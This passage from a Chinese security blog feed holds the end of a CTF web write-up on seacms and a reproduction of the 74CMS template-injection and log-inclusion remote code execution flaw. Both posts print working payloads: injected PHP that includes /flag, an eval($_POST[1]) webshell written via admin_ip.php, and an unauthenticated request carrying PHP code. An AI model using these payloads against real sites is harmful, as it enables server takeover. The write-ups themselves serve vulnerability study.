//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="0x04-大家一起来审代码">0x04 大家一起来审代码</h2><p>看到这种量级的代码，出题人一般都是拿别市面上的CMS，这个时候就可以先找配置文件看看，在data/common.inc.php文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228213535.png" alt=""></p><p>有两个信息：第一出题人用的是seacms，第二数据库的用户名和密码是admin,admin，这个也是本网站的后台密码。</p><p>既然是seacms，那我们就充分发挥Google的作用：<a href="https://lhlh22.github.io/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89">https://lhlh22.github.io/2020/10/22/Seacms-v10-1-后台getshell/#后台命令执行（三）</a></p><p>这篇文章提到了admin_notify.php文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228214002.png" alt=""></p><p>过滤掉了括号和反引号，那么我们就可以直接<code>include &quot;/flag&quot;;</code>即可，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;adm1n&#x2F;admin_notify.php?action&#x3D;set</span><br><span class="line">POST: notify1&#x3D;&quot;;include &quot;&#x2F;flag&quot;;&#x2F;&#x2F;&amp;notify2&#x3D;2&amp;notify3&#x3D;3</span><br></pre></td></tr></table></figure><p>再访问<code>/data/admin/notify.php</code></p><p>除此之外，<code>adm1n/admin_ip.php</code>也可以写入webshell：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201228215247.png" alt=""></p><p>不知道这个preg_match有啥用。。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: v&#x3D;&quot;;eval($_POST[1]);&#x2F;&#x2F;&amp;ip&#x3D;1.1.1.1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;纵横杯2020-Web-WriteUp&quot;&gt;纵横杯2020 Web WriteUp&lt;/h1&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1YiLgk931hrz3uqnQD3Dz6A&quot;&gt;https://
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>骑士CMS模板注入+文件包含getshell复现</title>
    <link href="http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-19T13:23:50.000Z</published>
    <updated>2020-12-19T13:24:50.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="骑士CMS模板注入-日志包含RCE复现">骑士CMS模板注入+日志包含RCE复现</h1><p>本文参考自TimeLine Sec团队成员microworld的复现记录。</p><h2 id="0x01-漏洞概述">0x01 漏洞概述</h2><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p><h2 id="0x02-影响版本">0x02 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p><h2 id="0x03-环境搭建">0x03 环境搭建</h2><p>从官网下载6.0.20版本源代码</p><p><a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p><p>新建数据库，用MAMP Pro搭建站点</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201214210511.png" alt=""></p><h2 id="0x04-漏洞复现">0x04 漏洞复现</h2><p>发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;</span><br><span class="line">1</span><br><span class="line">&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215153839.png" alt=""></p><ol start="2"><li>查看站点日志，文件位于<code>/data/Runtime/Logs/home/20_12_15.log</code></li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154016.png" alt=""></p><ol start="3"><li>包含日志</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154208.png" alt=""></p><h2 id="0x05-漏洞分析">0x05 漏洞分析</h2><p>在正式分析漏洞之前，先看一看74CMS的路由和日志记录。</p><p>由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure><p>但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数</span><br></pre></td></tr></table></figure><p>当然这些参数也是可以自定义的，配置文件位于<code>ThinkPHP/Conf/convention.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154751.png" alt=""></p><p>其次，ThinkPHP定义了日志记录的方式，在<code>ThinkPHP/Library/Think/Log.class.php</code>中的write方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215155115.png" alt=""></p><p>ERR代表一般性错误，<code>$destination</code>是日志的存储位置，日志文件名是有<code>年_月_日</code>组成。</p><p>根据官方通告，漏洞代码位于<code>Application/Common/Controller/BaseController.class.php</code>的<code>assign_resume_tpl</code>方法，用于渲染简历模板：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160033.png" alt=""></p><p>继续跟进fetch函数，该函数位于<code>Controllor.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160208.png" alt=""></p><p>函数内部又调用了<code>ThinkPHP/Lirary/Think/View.class.php</code>类中的<code>fetch</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160728.png" alt=""></p><p><code>content</code>为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断<code>TMPL_ENGINE_TYPE</code>是否是<code>php</code>，我们可以全局搜索这个常量，在<code>ThinkPHP/Conf/convention.php</code>中定义为<code>Think</code>，也就是说使用Think模板，那么就进入到else语句中。</p><p>首先构造一个参数数组<code>$params</code>，然后将调用静态方法<code>Hook::listen</code>，继续跟进，位于<code>ThinkPHP/Library/Hook.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215161649.png" alt=""></p><p>此时<code>tag=view_parse</code>，该方法会查找<code>$tags</code>中有没有绑定<code>view_parse</code>事件的方法，然后用foreach遍历<code>$tags</code>属性，并执行<code>Hook:exec</code>方法。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215172131.png" alt=""></p><p>此方法会检查行为名称中是否存在<code>Behavior</code>，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在<code>/ThinkPHP/Mode/common.php</code>中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184343.png" alt=""></p><p>继续跟进到<code>ThinkPHP/Behavior/ParseTemplateBehavior.class.php</code>，找到文件中的run方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184717.png" alt=""></p><p>已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于<code>ThinkPHP/Library/Think/Template.class.php</code>文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185208.png" alt=""></p><p>调用<code>loadTemplate()</code>，将其存入<code>templateCacheFile</code>中，我们跟入<code>loadTemplate</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185930.png" alt=""></p><p>首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215190136.png" alt=""></p><p>传入的模板内容未经过过滤就直接被拼接到<code>$tmplContent</code>变量，然后返回<code>loadTemplate</code>方法，调用<code>put</code>方法写入缓存文件，并返回缓存文件名，于是我们再回归到<code>fetch()</code>方法，调用了<code>Storage::load</code>，位于<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215191004.png" alt=""></p><p>这里就直接包含文件，最终造成了模板注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;骑士CMS模板注入-日志包含RCE复现&quot;&gt;骑士CMS模板注入+日志包含RCE复现&lt;/h1&gt;
&lt;p&gt;本文参考自TimeLine Sec团队成员microworld的复现记录。&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞概述&quot;&gt;0x01 漏洞概述&lt;/h2&gt;
&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
